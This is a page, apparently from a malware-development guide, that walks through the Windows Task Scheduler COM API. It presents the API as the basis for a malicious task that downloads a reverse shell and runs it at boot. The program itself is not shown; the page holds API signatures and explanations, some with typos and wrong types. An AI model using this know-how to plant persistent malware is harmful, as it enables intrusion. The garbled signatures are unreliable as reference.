<div id="admonition-note-4" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-4-title">
<div class="admonition-title">
<div id="admonition-note-4-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Persistence.html#admonition-note-4"></a>
</div>
<div>
<p>The <strong>Component Object Model</strong> (COM) is a Microsoft technology that provides standard interface for software components to interact with one another, enabling language agnostic, modular, and distributive software development. COM is used as the underlying architecture for many of Microsoft's core technologies, including:</p>
<ul>
<li><strong>DirectX</strong></li>
<li><strong>The Windows Shell</strong></li>
<li><strong>WinRT</strong></li>
<li><strong>The Task Scheduler API</strong></li>
</ul>
</div>
</div>
<p>Scheduled tasks require at least a medium integrity level by default. However, elevated users can create scheduled tasks that run with higher privileges, under system accounts.</p>
<p>Here, we will examine an example of a malicious scheduled task payload, which installs a reverse shell payload from a remote server and schedules it to run when the system starts.</p>
<div id="admonition-note-5" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-5-title">
<div class="admonition-title">
<div id="admonition-note-5-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Persistence.html#admonition-note-5"></a>
</div>
<div>
<p><strong>Cross-Compiling Scheduled Task Programs Can Be Difficult</strong>. The following program defines signature's for certain Windows Service Data types, which are not accessible to cross-compilers by default. This makes the program much longer than it would otherwise have to be, though it can now successfully be compiled and run on a Windows System, so long as the correct libraries are linked during compilation.</p>
</div>
</div>
<p>Where:</p>
<ul>
<li><code>SysAllocString</code>: A standard Windows API function used in <strong>Component Object Model</strong> (COM) programming, which safely allocates memory for a new BSTR (Basic String) and copies a given wide-character string into it.
<ul>
<li>Part of the <strong>OLE Automation API</strong> (<code>oleaut32.dll</code>). It is essential for creating strings that are correctly formatted and managed for use by COM interfaces.</li>
<li>A <code>BSTR</code> is a special type of string used by COM and Automation. It is a pointer to the first character of the string, but the memory allocated immediately preceding the string data contains a 32-bit length prefix indicating the total number of bytes in the string (not including the final null terminator). This length prefix is what makes <code>BSTR</code> a safe and efficient option in COM.</li>
<li>If <code>SysAllocString</code> succeeds, the memory for the new <code>BSTR</code> is allocated, and the caller is responsible for freeing it later using the corresponding API function <code>SysFreeString</code>.</li>
</ul>
<pre><code class="language-C">BSTR SysAllocString(
    [in, optional] const OLECHAR *sz
);
</code></pre>
Here is a breakdown of the <code>SysAllocString</code> function's parameters:
<ul>
<li><code>sz</code>: A pointer to a null-terminated, wide-character string that will be copiued into the new BSTR
On success, <code>SysAllocString</code> returns a pointer to the newly allocated <code>BSTR</code> string. On failure, it returns <code>NULL</code>.</li>
</ul>
</li>
<li><code>CoInitializeEx</code>: A fundamental Windows API function that is required to initialize the COM library for the calling thread. Every thread that uses COM services must call this function before making any other COM-related calls. It prepares the thread's infrastructure to correctly create and manage COM objects and interfaces.
<pre><code class="language-C">HRESULT CoInitializeEx(
    [in, optinal] LPVOID pvReserved,
    [in] DWORD dwCoInit
);
</code></pre>
Here is a breakdown of the <code>CoInitializeEx</code> function's parameters:
<ul>
<li><code>pvReserved</code>: A reserved pointer value that must always be set to <code>NULL</code>.</li>
<li><code>dwCoInit</code>: The flag that specified the concurrency model the thread will use for COM objects. This is the critical parameter. Usually set using one of the following flags, often combined:
_ <code>COINIT_APARTMENTTHREADED</code>: Initializes the thread as an Apartment thread. All COM calls on this thread are serialized (queued) by COM, meaning object codes do not need to handle concurrent access.
_ <code>COINIT_MULTITHREADED</code>: Initializes the thread as a Free Thread. COM allows concurrent calls to objects created on this thread, meaning the object's code must handle its own thread synchronization (locking).
_ <code>COINIT_DISABLE_OLE1DDE</code>: Disables the OLE DDE support.
_ <code>COINIT_SPEED_OVER_MEMORY</code>: Instructs COM to favor performance over memory usage.
<code>CoInitializeEx</code> returns an <code>HRESULT</code> value, which indicates success or failure:</li>
<li><code>Success</code>: <code>S_OK</code> or <code>S_FALSE</code>, meaning COM was already initialized on the thread</li>
<li><code>Failure</code>: Any value where <code>FAILED(hr)</code> evaluates to <code>TRUE</code>.</li>
</ul>
</li>
</ul>
<div id="admonition-note-6" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-6-title">
<div class="admonition-title">
<div id="admonition-note-6-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Persistence.html#admonition-note-6"></a>
</div>
<div>
<p>A <strong>thread</strong> is an execution unit, while an <strong>apartment</strong> is a way of managing how threads interact with COM objects. The two main types of apartment are <strong>Single-Threaded Apartments</strong> (STAs) and <strong>Multi-Threaded Apartments</strong> (MTAs).</p>
</div>
</div>
<ul>
<li>
<p><code>FAILED</code>: A macro defined in the Windows SDK that is used to check the return value of any Windows function that uses the <code>HRESULT</code> or <code>SCODE</code> data type. Its purpose is to determine if a call to a COM function resulted in an error. It is defined in <code>winerror.h</code>.</p>
<pre><code class="language-C">#define FAILED(hr)(((HRESULT)(hr)) &lt; 0)
</code></pre>
<p>Here is a breakdown of the <code>FAILED</code> macro's parameters:</p>
<ul>
<li><code>hr</code>: The <code>HRESULT</code> value returned by a Windows API or COM method call.
The result yielded from the <code>FAILED</code> macro is a BOOLEAN, <code>TRUE</code> if a failure occurred, <code>FALSE</code> otherwise.</li>
</ul>
</li>
<li>
<p><code>goto</code>: A <code>C</code> control flow statement that performs an unconditional jump from one part of a function to another labeled statement within the same function.</p>
<ul>
<li>It is made up of two parts:
<ol>
<li><strong>The <code>goto</code> statement</strong>: The instruction that causes the jump, followed by the name of the label (i.e., <code>goto &lt;label_name&gt;</code>).</li>
<li><strong>The Label</strong>: A marker that identifies the destination of the jump. It is simply an identifier followed by a colon (i.e., <code>label_name: &lt;statement&gt;;</code>)
It is typically used to simplify complex resource management and error handling, especially when dealing with multiple points of failure that all require the same exit logic.</li>
</ol>
</li>
</ul>
</li>
<li>
<p><code>CoInitializeSecurity</code>: A fundamental Windows API function used in COM programming to establish the security settings for a thread or an entire process that uses COM objects. It must be called before creating COM objects, registering interfaces, or using any COM features that involve cross-process or remote communication channels, which require an established security policy.</p>
<ul>
<li>It establishes default security values for:
<ul>
<li><code>Authentication</code>: Who can talk to the process</li>
<li><code>Authorization</code>: What permissions they have</li>
<li><code>Impersonation</code>: How the server handles the client's identity</li>
</ul>
</li>
</ul>
<pre><code class="language-C">HRESULT CoInitializeSecurity(
    [in, optional] PSECURITY_DESCRIPTOR pSecDesc,
    [in] LONG cAuthSvc,
    [in, optional] PEfenseInfo pAuthSvc,
    [in, optional] void *pReserved1,
    [in] DWORD dwAuthnLevel,
    [in] DWORD dwImpLevel,
    [in, optional] void *pAuthList,
    [in] DWORD dwCapabilities,
    [in, optional] void *pReserved3
);
</code></pre>
<p>Here is a breakdown of the <code>CoInitializeSecurity</code> function's parameters:</p>
<ul>
<li><code>pSecDesc</code>: A pointer to the security descriptor. If this is <code>NULL</code>, COM constructs a default security descriptor based on the other parameters and machine settings.</li>
<li><code>cAuthSvc</code>: The count of entries in the <code>pAuthSvc</code> parameter. If set to <code>-1</code>, COM chooses which authentication services to register.</li>
<li><code>pAuthSvc</code>: An array of authentication service information structures. Typically set to <code>NULL</code> when <code>cAuthSvc</code> is set to <code>-1</code>.</li>
<li><code>pReserved1</code>: Reserved. Set to <code>NULL</code>.</li>
<li><code>dwAuthnLevel</code>: The default authentication level for the process. This is the degree to which the server proves its identity:
<ul>
<li><code>RPC_C_AUTHN_LEVEL_NONE</code>: No authentication. The identity of the client is not checked. Only used for local, non-sensitive communication where performance is critical.</li>
<li><code>RPC_C_AUTHN_LEVEL_CONNECT</code>: Authentication only occurs when the client first establishes a connection with the server. Provides basic security without overhead on every call.</li>
<li><code>RPC_C_AUTHN_LEVEL_CALL</code>: Authentication occurs at the beginning of every call. Ensure client identity is valid for the duration of the call.</li>
<li><code>RPC_C_AUTHN_LEVEL_PKT</code>: Ensures all data packets send by the client contain a digital signature to verify the data's integrity and client's identity. Good for protecting against basic data tampering.</li>
<li><code>RPC_C_AUTHN_LEVEL_PKT_INTEGRITY</code>: Ensures that all data is signed and the entire message has not been modified in transit.</li>
<li><code>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</code>: Provides the highest level of security. Includes packet integrity and also encrypts the argument values for every remote procedure call. Recommended for secure applications where data confidentiality is required.</li>
</ul>
</li>
<li><code>dwImpLevel</code>: The default impersonation level for proxies. Defines how much authority the client grants to the server to act on its behalf.
<ul>
<li><code>RPC_C_IMP_LEVEL_ANONYMOUS</code>: The client is anonymous to the server. The server cannot access any client specific information.</li>
<li><code>RPC_C_IMP_LEVEL_IDENTITY</code>: The server can obtain the client's identity and query the client's privileges but cannot impersonate the client to access resources.</li>
<li><code>RPC_C_IMP_LEVEL_IMPERSONATE</code>: The server can act on the client's behalf to access local resources on the same computer, only if the client has been granted permission.</li>
<li><code>RPC_C_IMP_LEVEL_DELEGATE</code>: The highest level. The server can act on the client's behalf to access resources on a remote computer. Requires Kerberos delegation.</li>
</ul>
</li>
<li><code>pAuthList</code>: A pointer to a list of client and server identities. Often set to <code>NULL</code>.</li>
<li><code>dwCapabilities</code>: A set of flags to indicate the capabilities of the client or server, primarily related to marshaling (passing interfaces between apartments or processes) and synchronization.
<ul>
<li><code>EOAC_NONE</code>: The default. No specific capabilities are set</li>
<li><code>EOAC_MUTUAL_AUTH</code>: Requires both the client and server to authenticate each other, ensuring two-way trust in secure applications.</li>
<li><code>EOAC_STATIC_CLOAKING</code>: Uses the client's process token when communicating with the server. Bypasses the need for explicit delegation checks in some cases.</li>
<li><code>EOAC_DYNAMIC_CLOAKING</code>: Uses the client's most recent security context when communicating. More secure than static, as it adapts to token changes.</li>
<li><code>EOAC_NO_CUSTOM_MARSHAL</code>: Prevents the use of custom marshaling, which can sometimes be exploited. Enhances security by limiting object transport mechanisms.</li>
</ul>
</li>
<li><code>pReserved3</code>: Reserved. Set to <code>NULL</code>.</li>
</ul>
<p><code>CoInitializeSecurity</code> returns an <code>HRESULT</code> (<code>S_OK</code> for Success)</p>
</li>
<li>
<p><code>CoCreateInstance</code>: A fundamental Windows API function used in COM programming for creating an instance of a COM object and initializing it to interact with it via it's methods.</p>
<pre><code class="language-C">HRESULT CoCreateInstance(
    [in] REFCLSID rclsid,
    [in, optional] LPUNKNOWN pUnkOuter,
    [in] DWORD dwClsContext,
    [in] REFIID riid,
    [out] LPVOID *ppv
);
</code></pre>
<p>Here is a breakdown of the <code>CoCreateInstance</code> function's parameters:</p>
<ul>
<li><code>rclsid</code>: The Class ID (<code>CLSID</code>) of the object you want to create (i.e., <code>CLSID_TaskScheduler</code>, <code>CLSID_RecycleBin</code>, <code>CLSID_Run</code>)</li>
<li><code>pUnkOuter</code>: Used for aggregation. Must be set to <code>NULL</code> unless you are creating an aggregated object.</li>
<li><code>dwClsCntext</code>: The execution context in which the object is to be run. Specifies whether the component is in-process (DLL), local executable, or remote.</li>
<li><code>riid</code>: The Interface ID of the interface you want to retrieve a pointer to (i.e., <code>IID_ITask_Service</code>, <code>IID_ITaskFolder</code>, <code>IID_IRegisteredTask</code>)
<ul>
<li><code>CLSCTX_INPROC_SERVER</code>: The object is implemented in a DLL and runs in the same process as the caller.</li>
<li><code>CLSCTX_LOCAL_SERVER</code>: The object is implemented in an EXE and runs as a separate process on the local machine.</li>
<li><code>CLSCTX_REMOTE_SERVER</code>: The object is implemented on a separate machine.</li>
<li><code>CLSCTX_ALL</code>: Checks all installed contexts (in-process, local, remote). General purpose usage.</li>
</ul>
</li>
<li><code>ppv</code>: The address of a pointer variable that receives the requested interface pointer (<code>riid</code>). If the function succeeds, this pointer is the entry point for interacting with the object. If it fails, the value is set to <code>NULL</code>.</li>
</ul>
<p><code>CoCreateInstance</code> returns an <code>HRESULT</code> value, indicating success or failure. Use the <code>FAILED()</code> macro to check this result.</p>
</li>
<li>
<p><code>ITaskService</code>: A COM Interface that acts as the primary gateway to the Windows Task Scheduler service. Its methods provide the necessary functionality to connect to and manage the task hierarchy, as well as the ability to create new task definitions.</p>
<ul>
<li>
<p><code>Connect</code>: Connects to the Task Scheduler service on the local machine or a remote machine. Typically the first method called after creating the <code>ITaskService</code> object.</p>
<pre><code class="language-C">HRESULT ITaskService::Connect(
  [in, optional] VARIANT serverName,
  [in, optional] VARIANT user,
  [in, optional] VARIANT domain,
  [in, optional] VARIANT password
);
</code></pre>
<ul>
<li>
<p>Here is a breakdown of the <code>Connect</code> method's parameters:</p>
<ul>
<li><code>serverName</code>: The name of the computer to connect to. If left empty, it defeaults to the local computer.</li>
<li><code>user</code>: The user name to use for connecting to the service. If empty, it defaults to the current user's credentials.</li>
<li><code>domain</code>: The domain or workgroup of the user account. If left empty, the credentials apply to the local machine or default domain.</li>
<li><code>password</code>: The password for the specified user. Must be provided if <code>user</code> is provided. If left empty, the current user's password is used.</li>
</ul>
</li>
<li>
<p><code>Connect</code> returns an <code>HRESULT</code> value. The <code>S_OK</code> value indicates success.</p>
</li>
</ul>
<blockquote>
<p><code>VARIANT</code> is a special structure used in COM programming, OLE Automation, and scripting languages, which is designed to hold the data of almost any type, providing a standard way to pass data between COM components where the exact data type is not known until runtime.</p>
</blockquote>
</li>
<li>
<p><code>GetFolder</code>: A crucuial function in the Windows Task Scheduler API used to navigate and access the folder hierarchy where scheduled tasks are stored, enabling subsequent operations like querying, creating, deleting, or retrieving existing tasks within that folder.</p>
<pre><code class="language-C">HRESULT ITaskService::GetFolder(
  [in] BSTR path,
  [out] ITaskFolder **ppFolder
);
</code></pre>
<ul>
<li>
<p>Here is a breakdown of the <code>GetFolder</code> method's parameters:</p>
<ul>
<li><code>path</code>: The path to the task folder ou want to access. This must be a <code>BSTR</code>. For the root folder, the path is <code>L"\\"</code>.</li>
<li><code>ppFolder</code>: The address of a pointer variable that receives the <code>ITaskFolder</code> interface pointer for the requrested folder. This is the output pointer you use for subsequent task management.</li>
</ul>
</li>
<li>
<p>The <code>GetFolder</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the folder was successfully retrieved and the <code>ppFolder</code> pointer is valid.</p>
</li>
</ul>
</li>
<li>
<p><code>NewTask</code>: An important method in the Windows Task Scheduler API that is used to create a new, empty task definition object. It is crucial for retrieving a pointer to the <code>ITaskDefinition</code> interface, which represents a blank template for a scheduled task and is where the task's properties are configured.</p>
<pre><code class="language-C">HRESULT ITaskService::NewTask(
  [in] DWORD flags,
  [out] ITaskDefinition **ppDefinition
);
</code></pre>
<ul>
<li>
<p>Here is a breakdown of the <code>NewTask</code> method's parameters:</p>
<ul>
<li><code>flags</code>: Reserved for future use. Must be set to <code>0</code>.</li>
<li><code>ppDefinition</code>: The address of a pointer variable that receives the <code>ITaskDefinition</code> interface pointer. This is the output pointer to the newly created blank task template.</li>
</ul>
</li>
<li>
<p>The <code>NewTask</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates a new task definition object was successfully created and the <code>ppDefinition</code> pointer is valid.</p>
</li>
</ul>
</li>
<li>
<p><code>Release</code>: A method from the foundational <code>IUnknown</code> COM interface, used to decrement the reference count of a given COM object. It takes no parameters, It only exists to free the memory associated with a COM object, preventing memory leaks.</p>
</li>
</ul>
</li>
</ul>
<ul>
<li>
<p><code>ITaskFolder</code>: A COM interface, which is part of the Windows Task Scheduler API and represents a container or directory within the Task Scheduler's hierarchical structure, allowing a program to manage and interact with tasks stored in a specific location. It provides methods necessary for Task Creation, Task Deletion, Task Querying, and SubFolder management.</p>
<ul>
<li>
<p><code>DeleteTask</code>: Permanently removes a scheduled task from a specific folder within the Windows Task Scheduler.</p>
<pre><code class="language-C">HRESULT ITaskFolder::DeleteTask(
  [in] BSTR name,
  [in] long flags
);
</code></pre>
<ul>
<li>
<p>Here is a breakdown of the <code>DeleteTask</code> method's parameters:</p>
<ul>
<li><code>name</code>: The name of the task to be deleted.</li>
<li><code>flags</code>: Reserved. Set to <code>0</code>.</li>
</ul>
</li>
<li>
<p>The <code>DeleteTask</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates that the task was deleted successfully.</p>
</li>
</ul>
</li>
<li>
<p><code>RegisterTaskDefinition</code>: A method within the Windows Task Scheduler API which takes a fully defined task object and registers it with the Windows Task Scheduler services making it active and persistent. It is the final and most critical step in creating or updating a scheduled task. It instructs the Task Scheduler to check the structure and contents of the Task definition, create and sae the task's XML definition file in the appropriate system directory (<code>C:\Windows\System32\Tasks\</code>), and update the service's internal registry and in-memory schedule so the task can be executed when its triggers are met.</p>
<pre><code class="language-C">HRESULT ITaskFolder::RegisterTaskDefinition(
  [in] BSTR path,
  [in] ITaskDefinition *pDefinition,
  [in] LONG flags,
  [in] VARIANT userId,
  [in] VARIANT password,
  [in] TASK_LOGON_TYPE logonType,
  [in] VARIANT sddl,
  [out] IRegisteredTask **pTask
);
</code></pre>
<ul>
<li>
<p>Here is a breakdown of the <code>RegisterTaskDefinition</code> method's parameters:</p>
<ul>
<li><code>path</code>: The name to assign to the new task.</li>
<li><code>pDefinition</code>: A pointer to the fully configured task definition object created via <code>ITaskService::NewTask()</code>.</li>
<li><code>flags</code>: Flags that define how the task is registered.
<ul>
<li><code>TASK_REGISTRATION_CREATE_NEW</code>: Creates the task only if one with the same name doesn't exist.</li>
<li><code>TASK_REGISTRATION_UPDATE</code>: Updates an existing task with the new definition.</li>
<li><code>TASK_CREATE_OR_UPDATE</code>: If the task exits, it updates it. Otherwise it creates a new one.</li>
</ul>
</li>
<li><code>userId</code>: The user account name under which the task is registered and will run. Often passed as an empty <code>VARIANT</code> to use the current user's security context.</li>
<li><code>password</code>: The password for the user account specified in <code>userId</code>. Often passed as an empty <code>VARIANT</code>.</li>
<li><code>logonType</code>: Specifies the security context required to run the task.
<ul>
<li><code>TASK_LOGON_NONE</code>: The task runs with the least privileges. No credentials are explicitly required to be registered with the task. Used for non-interactive tasks where no specific user identity is required.</li>
<li><code>TASK_LOGON_S4U</code>: Services for user. The task runs under a specified user account but the user does not have to be logged on.</li>
<li><code>TASK_LOGON_INTERACTIVE_TOKEN</code>: The task runs using a token that is valid only if the user specified in the task is currently logged on. Ensures a task runs only when a user session is active.</li>
<li><code>TASK_LOGON_GROUP</code>: The task runs with the credentials of a user or a group of users specified in the task definition. Allows the task to run if any member of the specified group logs on.</li>
<li><code>TASK_LOGON_SERVICE_ACCOUNT</code>: The task runs as a service account that is already registered on the machine. Used for highly privileged background system processes that do not need a desktop session.</li>
<li><code>TASK_LOGON_PASSWORD</code>: The task runs using a specific user account and password that must be supplied and stored by the Task SCheduler. Used for running under specific accounts, often when the user is not logged on.</li>
</ul>
</li>
<li><code>sddl</code>: Security Descriptor Definition Language string, which explicitly sets the permissions for the task. It is optional and typically passed as an empty <code>VARIANT</code>.</li>
<li><code>ppTask</code>: An output pointer that receives an <code>IRegisteredTask</code> interface, representing the active, newly registered task. This pointer must be released before the program exits to prevent memory leaks.</li>
</ul>
</li>
<li>
<p>The <code>RegisterTaskDefinition</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the task was successfully registered.</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li>
<p><code>ITaskDefinition</code>: A COM interface, which acts as the blueprint/template for a scheduled task in the Windows Task SCheduler API. It is the object which defines what a task does and when it does it. It provides methods for Task Triggers, Task Actions, Task Security Context, Task behaviors and more.</p>
<ul>
<li>
<p><code>get_Principal</code>: A critical method in the Task Scheduler API used to retrieve the interface that defines the security context under which a task will run.</p>
<pre><code class="language-C">HRESULT ITaskDefinition::get_Principal(
  [out] IPrincipal **ppPrincipal
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>get_Principal</code> method's parameters: -<code>ppPrincipal</code>: The address of a pointer variable that will receive the IPrincipal interface pointer. This is the output pointer used to configure the tasks security context.</li>
<li>The <code>get_Principal</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the <code>IPrincipal</code> object was successfully created and the <code>ppPrincipal</code> pointer is valid.</li>
</ul>
<div id="admonition-note-7" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-7-title">
<div class="admonition-title">
<div id="admonition-note-7-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Persistence.html#admonition-note-7"></a>
</div>
<div>
<p>The caller is responsible for calling <code>Release()</code> on the resulting <code>IPrincipal</code> pointer when finished to prevent memory leaks.</p>
</div>
</div>
</li>
<li>
<p><code>get_Triggers</code>: A fundamental method in the Task Scheduler API used to retrieve the collection interface that defines when a task will be executed. It is responsible for retrieving a pointer to the <code>ITriggerCollection</code> COM interface, which adds individual triggers to the task definition.</p>
<pre><code class="language-C">HRESULT ITaskDefinition::get_Triggers(
  [out] ITriggerCollection **ppTriggers
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>get_Triggers</code> method's parameters:
<ul>
<li><code>ppTriggers</code>: The address of a pointer variable that will receive the <code>ITriggerCollection</code> interface pointer. This is the output pointer used to manage the task's triggers.</li>
</ul>
</li>
<li>The <code>get_Triggers</code> method returns an <code>HRESULT</code>. <code>S_OK</code> indicates the <code>ITriggerCollection</code> object was successfully created/retrieved and the <code>ppTriggers</code> pointer is valid. Must use <code>Release()</code> when finished.</li>
</ul>
</li>
<li>
<p><code>get_Actions</code>: A fundamental method in the Task Scheduler API used to retrieve a pointer to the collection interface that defines what a task will execute when it is triggered.</p>
<pre><code class="language-C">HRESULT ITaskDefinition::get_Actions(
  [out] IActionCollection **ppActions
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>get_Actions</code> parameters:
<ul>
<li><code>ppActions</code>: The address of a pointer variable that will receive the <code>IActionCollection</code> interface pointer. This is the output pointer used to manage the task's actions.</li>
</ul>
</li>
<li>The <code>get_Actions</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates that the <code>IActionCollection</code> object was successfully created/retrieved and the <code>ppActions</code> pointer is valid. You must use <code>Release()</code> when finished.</li>
</ul>
</li>
<li>
<p><code>get_Settings</code>: A fundamental method in the Task Scheduler API used to retrieve a pointer to the <code>ITaskSettings</code> COM interface.</p>
<pre><code class="language-C">HRESULT ITaskDefinition::get_Settings(
  [out] ITaskSettings::get_Settings **ppSettings
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>get_Settings</code> method's parameters:
<ul>
<li><code>ppSettings</code>: The address of a pointer variable that will receive the <code>ITaskSettings</code> interface pointer. This is the output pointer used to configure the task's operational behavior.</li>
</ul>
</li>
<li>The <code>get_Settings</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates that the <code>ITaskSettings</code> object was successfully created/retrieved and the <code>ppSettings</code> pointer is valid. Must use <code>Release()</code> when finished.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>IPrincipal</code>: A component of the Windows Task Scheduler API dedicated entirely to defining the security and identity under which a scheduled task will execute. It is primarily responsible for specifying the user account and privilege level for the task, which dictates its abilities and limitations on the system. It contains methods for managing user identity, privilege level, logon type, and process security.</p>
<ul>
<li>
<p><code>put_LogonType</code>: A property setter in the Task Scheduler API used to define the executino requirement or the type of security token the task needs to run. It sets the condition under which the Task Scheduler service will allow the task's action to execute after its trigger has fired.</p>
<pre><code class="language-C">HRESULT IPrincipal::put_LogonType(
  [in] TASK_LOGON_TYPE logonType
);
</code></pre>
<ul>
<li>
<p>Here is a breakdown of the <code>put_LogonType</code> method's parameters:</p>
<ul>
<li><code>put_LogonType</code>: A value from the enumeration that specifies the required security context for the task to run.</li>
</ul>
<div id="admonition-note-8" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-8-title">
<div class="admonition-title">
<div id="admonition-note-8-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Persistence.html#admonition-note-8"></a>
</div>
<div>
<p>See <code>RegisterTaskDefinition</code> to see what values can be passed to <code>put_LogonType</code>.</p>
</div>
</div>
</li>
<li>
<p>The <code>put_LogonType</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates that the logon type was successfully set on the <code>IPrincipal</code> object.</p>
</li>
</ul>
</li>
<li>
<p><code>put_RunLevel</code>: A property setter used to set the security run level for the task's process token. It dictates whether the task will execute with standard user privileges or with elevated administratiev privileges.</p>
<pre><code class="language-C">HRESULT IPrincipal::put_RunLevel(
  [in] TASK_RUNLEVEL_TYPE runLevel
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>put_RunLevel</code> method's parameters:
<ul>
<li><code>runLevel</code>: A value from the enumeration that specifies the privilege level the task should run at.
<ul>
<li><code>TASK_RUNLEVEL_LUA</code>: Least-privilege User Account. The task will run with the standard, filtered token for a normal user.</li>
<li><code>TASK_RUNLEVEL_HIGHEST</code>: The task runs with the highest privileges available to the specified user.</li>
</ul>
</li>
</ul>
</li>
<li>The <code>put_RunLevel</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the run level was successfully set on the <code>IPrincipal</code> object.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>ITriggerCollection</code>: A vital component of the Windows Task Scheduler API, which acts as a container or array for all the specific triggers that define when a scheduled task will start. It is responsible for creating, deleting and configuring new trigger objects.</p>
<ul>
<li><code>Create</code>: The primary method used to instantiate a new trigger object within the Task Scheduler API, which is then configured to define a specific start condition for a scheduled task.
<pre><code class="language-C">HRESULT ITriggerCollection::Create(
  [in] TASK_TRIGGER_TYPE2 type,
  [out] ITrigger **ppTrigger
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>Create</code> method's parameters:
<ul>
<li><code>type</code>: A value from the enumeration that specifies the type of trigger to create.
<ul>
<li><code>TASK_TRIGGER_LOGON</code>: Triggers when a specified user logs on.</li>
<li><code>TASK_TRIGGER_DAILY</code>: Triggers at a specific time daily or every few days.</li>
<li><code>TASK_TRIGGER_TIME</code>: Triggers once at a specific date and time.</li>
<li><code>TASK_TRIGGER_EVENT</code>: Triggers when a specific event is written to the Windows Event Log.</li>
<li><code>TASK_TRIGGER_BOOT</code>: Triggers when the system starts up.</li>
</ul>
</li>
<li><code>ppTrigger</code>: The address of a pointer variable that receives the <code>ITrigger</code> interface pointer for the newly created trigger object.</li>
</ul>
</li>
<li>The <code>Create</code> returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the trigger object was successfully created and the <code>ppTrigger</code> pointer is valid.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>ITrigger</code>: The generic, base interface for all specific types of triggers within the Windows Task Scheduler API. It defines the common properties and methods shared by every condition that can initiate a scheduled task, such as the trigger type, id, enabled state, start and end boundary.</p>
<ul>
<li>
<p><code>QueryInterface</code>: A foundational method inherited from the <code>IUnknown</code> base interface, making it essential for all COM objets. It is used to safely navigate between different interfaces supported by a single COM object.</p>
<pre><code class="language-C">HRESULT IUnknown::QueryInterface(
  [in] REFIID riid,
  [out] void **ppvObject
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>QueryInterface</code> method's parameters:
<ul>
<li><code>riid</code>: The Interface ID of the interface being requested
<ul>
<li><code>IID_ILogonTrigger</code>: Configures properties unique to a logon event.</li>
<li><code>IID_IDailyTrigger</code>: Configures tasks that run every day or every <code>N</code> days, including the specific time of day for execution.</li>
<li><code>IID_IEventTrigger</code>: Configures tasks that start when a specific Windows Event Log event occurs.</li>
<li><code>IID_IBootTrigger</code>: Configures tasks that run when the system boots up.</li>
</ul>
</li>
<li><code>ppvObject</code>: The address of the pointer variable that will receive the pointer to the requested interface. Typically gets typecasted.</li>
</ul>
</li>
<li>The <code>QueryInterface</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the object supports the interface and <code>ppvObject</code> is valid. <code>E_NOINTERFACE</code> indicates the object does not support the requested interface.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>IActionCollection</code>: A vital component of the Windows Task Scheduler APi, which acts as a container or array for all the specific actions that a scheduled task is configured to execute. It is primarily used to manage the various commands or programs that run when a task's trigger fires. A single task can have multiple actions. <code>IActionCollection</code> contains methods for creating actions and managing the collection's entries.</p>
<ul>
<li><code>Create</code>: The primary method used to instantiate a new action object within the Task Scheduler API, which is then configured to define a specific command or program that a scheduled task will execute.
<pre><code class="language-C">HRESULT IActionCollection::Create(
  [in] TASK_ACTION_TYPE type;
  [out] IAction **ppAction
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>Create</code> method's parameters:
<ul>
<li><code>type</code>: A value from the enumeration that specifies the type of action to create.
<ul>
<li><code>TASK_ACTION_EXEC</code>: Run a command line program or script.</li>
<li><code>TASK_ACTION_COM_HANDLER</code>: Execute a method no a registered COM handler object.</li>
</ul>
</li>
<li><code>ppAction</code>: A vital component of the Windows Task Scheduler API used to add a new action (i.e., "run a program", "send an email", "display a message") to a scheduled task.</li>
</ul>
</li>
<li>The <code>Create</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the action object was successfully created and the <code>ppAction</code> pointer is valid.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>IAction</code>: The generic, base interface for all specific types of actions within the Windows Task Scheduler API. It defines the common properties and methods shared by every command or program that a scheduled task can execute, such as the Action Type and ID.</p>
<ul>
<li>** QueryInterface Interface IDs**:
<ul>
<li><code>IID_IExecAction</code>: Configures an action that runs an executable or command line script</li>
<li><code>IID_IComHandlerAction</code>: Configures an action that executes a method on a registered COM object.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>IExecAction</code>: The component within the Windows Task Scheduler API used to define an action that runs a command line program, script, or executable file. It configures the exact command and environment for an executable action and defines methods for setting the executable path, arguments, and working directory.</p>
<ul>
<li>
<p><code>put_Path</code>: A property setter in the Task Scheduler API used to define the full path to the executable or script file that a scheduled task will launch when its action is executed.</p>
<pre><code class="language-C">HRESULT IExecAction::put_Path(
  [in] BSTR path
);
</code></pre>
<ul>
<li>Here is a breakdown of the method's parameters:
<ul>
<li><code>path</code>: The full, absolute path to the executable file that the task should execute.</li>
</ul>
</li>
<li>The <code>put_Path</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the path was successfully set on the <code>IExecAction</code> object.</li>
</ul>
</li>
